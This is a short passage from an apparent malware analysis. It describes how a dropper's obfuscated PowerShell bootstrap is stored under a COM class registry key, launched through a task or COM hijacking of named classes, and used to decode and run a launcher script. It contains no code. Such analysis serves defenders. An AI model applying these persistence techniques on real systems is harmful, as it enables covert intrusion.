Bootstrap The bootstrap is implemented as an obfuscated PowerShell script, generated dynamically by the dropper.
The content of the code is saved under the emulator's class LocalServer registry key
and it is either executed by a dedicated task in case of a privileged PowerShell process or by the operating system that attempts to load the emulator for the PlaySoundService or
MsCtfMonitor classes.
The bootstrap code finds the location of the launcher script, decodes it and then executes it within the same PowerShell process.
A decoded and sanitized version of the script is shown in Figure 7.
